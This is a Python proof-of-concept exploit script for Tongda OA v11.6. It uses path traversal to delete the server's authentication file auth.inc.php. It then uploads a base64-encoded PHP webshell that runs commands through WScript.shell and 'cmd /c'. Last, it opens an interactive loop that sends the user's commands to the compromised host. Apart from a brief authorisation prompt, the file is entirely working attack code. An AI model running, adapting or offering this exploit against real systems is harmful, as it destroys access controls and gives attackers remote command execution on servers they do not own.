#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import re
import base64
import sys


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 通达OA v11.6 任意文件删除&RCE                                \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                           \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+  \033[36mCmd    >>> whoami                                                 \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    check_url = target_url + "/module/appbuilder/assets/print.php"
    try:
        check_url_response  = requests.get(url = check_url)
        if check_url_response.status_code == 200:
            print("\033[32m[o] 存在 /module/appbuilder/assets/print.php 可能含有通达OA v11.6 任意文件删除&RCE漏洞\033[0m")
            input("\033[32m[o] 此漏洞会对真实环境造成影响，请在授权的情况下利用此漏洞，按下任意键继续..... \033[0m")
        else:
            print("\033[31m[x] 不存在 /module/appbuilder/assets/print.php 漏洞利用失败 \033[0m")
            sys.exit(0)
    except Exception as e:
            print("\033[31m[x] 请求失败，{} \033[0m".format(e))
            sys.exit(0)

def POC_2(target_url):
    unlink_url = target_url + "/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
    try:
        unlink_response = requests.get(url = unlink_url)
        if unlink_response.status_code == 200:
            print("\033[32m[o] 成功删除校验文件 auth.inc.php \033[0m")
        else:
            print("\033[31m[x] 删除校验文件 auth.inc.php 失败 \033[0m")
            sys.exit(0)
    except Exception as e:
            print("\033[31m[x] 请求失败，{} \033[0m".format(e))
            sys.exit(0)

def POC_3(target_url, payload_php):
    """
      (绕过的webshell)
      <?php
      $command=$_GET['test'];
      $wsh = new COM('WScript.shell');
      $exec = $wsh->exec("cmd /c ".$command);
      $stdout = $exec->StdOut();
      $stroutput = $stdout->ReadAll();
      echo $stroutput;
      ?>
    """
    vuln_url = target_url + "/general/data_center/utils/upload.php?action=upload&filetype=test&repkid=/.<>./.<>./.<>./"
    files = {'FILE1': ('test.php', payload_php)}
    try:
        vuln_response = requests.post(url = vuln_url,files=files)
        if vuln_response.status_code == 200:
            print("\033[32m[o] 成功写入webshell文件: _test.php \033[0m")
            print("\033[32m[o] webshell地址为: {}/_test.php \033[0m".format(target_url))
        else:
            print("\033[31m[x] 写入webshell文件失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败，{} \033[0m".format(e))
        sys.exit(0)

def POC_4(target_url, cmd):
    cmd_url = target_url + "/_test.php?test={}".format(cmd)
    try:
        cmd_response = requests.get(url = cmd_url)
        if cmd_response.status_code == 200:
            print("\033[32m[o] 正在执行命令: {} \033[0m".format(cmd_url))
            print("\033[32m[o] 响应为: \n{} \033[0m".format(cmd_response.text))
        else:
            print("\033[31m[x] 命令执行失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败，{} \033[0m".format(e))
        sys.exit(0)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
    POC_2(target_url)
    payload_php = base64.b64decode("PD9waHAKICAgICRjb21tYW5kPSRfR0VUWyd0ZXN0J107CiAgICAkd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwogICAgJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiAgICAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwogICAgJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKICAgIGVjaG8gJHN0cm91dHB1dDsKPz4=").decode("utf-8")
    POC_3(target_url, payload_php)

    while True:
        cmd = input("\033[35mCmd >>> \033[0m")
        if cmd == "exit":
            sys.exit(0)
        else:
            POC_4(target_url, cmd)


